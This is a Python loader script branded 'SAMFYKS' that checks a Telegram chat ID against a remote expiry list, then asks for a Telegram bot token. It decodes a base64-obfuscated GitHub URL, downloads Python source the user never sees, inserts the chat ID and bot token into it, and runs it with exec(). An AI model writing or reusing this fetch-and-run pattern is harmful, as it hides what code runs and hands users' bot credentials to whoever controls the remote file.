#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import sys
import subprocess
import os
import re
import time
import base64
from datetime import datetime, timedelta, timezone

for pkg in ["requests"]:
    try:
        __import__(pkg)
    except ImportError:
        subprocess.check_call([sys.executable, "-m", "pip", "install", pkg])

import requests

ACCESS_LIST_URL = "https://raw.githubusercontent.com/h4tp7/my-python-tool/main/expiry.txt"
IST_OFFSET = timedelta(hours=5, minutes=30)

GOLD   = '\x1b[38;5;220m'
ORANGE = '\x1b[38;5;208m'
WHITE  = '\x1b[38;5;255m'
DIM    = '\x1b[38;5;240m'
GREEN  = '\x1b[38;5;120m'
RED    = '\x1b[38;5;196m'
CYAN   = '\x1b[38;5;51m'
RESET  = '\x1b[0m'


def print_banner():
    os.system('cls' if os.name == 'nt' else 'clear')
    print("\n")
    print(f"{GOLD}           ✦           ·            ★            ·           ✦{RESET}")
    print(f"{WHITE}                                   ·            ✧{RESET}")
    print(f"{GOLD}                        𝗦 𝗔 𝗠 𝗙 𝗬 𝗞 𝗦{RESET}")
    print(f"{WHITE}                              ✦          ·{RESET}")
    print(f"{GOLD}           ✧           ·            ★            ·           ✧{RESET}")
    print("\n")
    print(f"{DIM}                     𝗗𝗘𝗩 /  @𝗦𝗔𝗠𝗚𝗢𝗗 / ✧           ·              {RESET}")
    print("\n")


def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')


def fetch(url, label, timeout=20):
    try:
        r = requests.get(url, timeout=timeout, headers={"User-Agent": "SAMFYKS-Loader/1.0"})
        r.raise_for_status()
        return r.text
    except Exception as e:
        print(f"{RED}❌ Failed to load {label}: {e}{RESET}")
        sys.exit(1)


def get_chat_id():
    if len(sys.argv) > 1:
        return sys.argv[1].strip()
    env = os.environ.get("TELEGRAM_CHAT_ID", "").strip()
    if env:
        return env
    return input(f"{WHITE}Enter Telegram Chat ID: {RESET}").strip()


def get_bot_token():
    env = os.environ.get("TELEGRAM_BOT_TOKEN", "").strip()
    if env:
        return env
    return input(f"{WHITE}Enter Telegram Bot Token: {RESET}").strip()


def check_access(chat_id, raw_list):
    now_ist = (datetime.now(timezone.utc) + IST_OFFSET).replace(tzinfo=None)
    for line in raw_list.splitlines():
        line = line.strip()
        if not line or "," not in line or ":" not in line:
            continue
        parts = line.split(",", 1)
        uid = parts[0].strip()
        if uid != str(chat_id):
            continue
        date_part = parts[1].strip()
        try:
            expiry_ist = datetime.strptime(date_part, "%Y-%m-%d : %H:%M")
        except ValueError:
            continue
        remaining = expiry_ist - now_ist
        if remaining.total_seconds() > 0:
            days, secs = divmod(int(remaining.total_seconds()), 86400)
            hours, secs = divmod(secs, 3600)
            minutes = secs // 60
            pretty = f"{days}d {hours}h {minutes}m"
            return True, f"{GREEN}✅ Authorized — expires in {pretty}{RESET}", pretty
        return False, f"{RED}⛔ Access expired.{RESET}", None
    return False, f"{RED}⛔ Chat ID not found in access list.{RESET}", None


def inject_inputs(src, chat_id, bot_token):
    src, n1 = re.subn(r"chat_id\s*=\s*input\([^)]*\)\.strip\(\)", f"chat_id = {chat_id!r}", src, count=1)
    if n1 == 0:
        src, n1 = re.subn(r"chat_id\s*=\s*input\([^)]*\)", f"chat_id = {chat_id!r}", src, count=1)

    src, n2 = re.subn(r"bot_token\s*=\s*input\([^)]*\)\.strip\(\)", f"bot_token = {bot_token!r}", src, count=1)
    if n2 == 0:
        src, n2 = re.subn(r"bot_token\s*=\s*input\([^)]*\)", f"bot_token = {bot_token!r}", src, count=1)

    if n1 == 0 or n2 == 0:
        print(f"{ORANGE}⚠️  Warning: could not auto-inject one or more inputs — script may prompt.{RESET}")
        time.sleep(1.2)
    return src


def progress_line(label, seconds=0.6):
    frames = ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"]
    end = time.time() + seconds
    i = 0
    while time.time() < end:
        sys.stdout.write(f"\r{CYAN}{frames[i % len(frames)]}{RESET} {label}")
        sys.stdout.flush()
        i += 1
        time.sleep(0.06)
    sys.stdout.write(f"\r{GREEN}✔{RESET} {label}\n")
    sys.stdout.flush()


def main():
    print_banner()

    chat_id = get_chat_id()
    if not chat_id:
        print(f"{RED}❌ Chat ID required.{RESET}")
        sys.exit(1)
    print("")

    print(f"{DIM}🔐 Verifying access…{RESET}")
    raw_access = fetch(ACCESS_LIST_URL, "access list")
    ok, msg, remaining = check_access(chat_id, raw_access)
    print(msg)
    if not ok:
        time.sleep(1.5)
        sys.exit(1)

    print("")
    bot_token = get_bot_token()
    if not bot_token:
        print(f"{RED}❌ Bot token required.{RESET}")
        sys.exit(1)

    clear_screen()
    print_banner()
    print(f"{DIM}                          SAMFYKS LOADER ACTIVE{RESET}")
    print(f"{DIM}                   Auth OK · Preparing session…{RESET}\n")

    _samfycks = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3NhbWt1c2h3YWg2MS1jcmVhdGUvQmhhaXlhYWEvbWFpbi9zYW1nb2QucHk="
    samsarkar = base64.b64decode(_samfycks).decode()

    progress_line(f"{WHITE}Fetching payload…{RESET}", seconds=0.8)
    src = fetch(samsarkar, "script")

    if "def process_user" not in src and "ThreadPoolExecutor" not in src:
        print(f"{ORANGE}⚠️  Warning: fetched script looks unusual — continuing anyway.{RESET}")

    progress_line(f"{WHITE}Injecting credentials…{RESET}", seconds=0.5)
    src = inject_inputs(src, chat_id, bot_token)

    try:
        code_obj = compile(src, "<samfycks>", "exec")
    except SyntaxError as e:
        print(f"{RED}❌ Syntax error in fetched script: {e}{RESET}")
        sys.exit(1)

    print(f"\n{GOLD}🚀 Launching SAMFYKS TOOLS…{RESET}")
    print(f"{DIM}   Access valid for {remaining}{RESET}")
    print(f"{GOLD}✦ ─────────────────────────────────────── ✦{RESET}\n")
    time.sleep(0.6)

    try:
        exec(code_obj, {"__name__": "__main__", "__file__": "samfycks.py"})
    except SystemExit:
        raise
    except KeyboardInterrupt:
        print(f"\n{GOLD}◄  SAMFYKS LOADER  —  SESSION ENDED  ►{RESET}")
    except Exception as e:
        print(f"\n{RED}❌ Runtime error: {e}{RESET}")
        sys.exit(1)


if __name__ == "__main__":
    main()
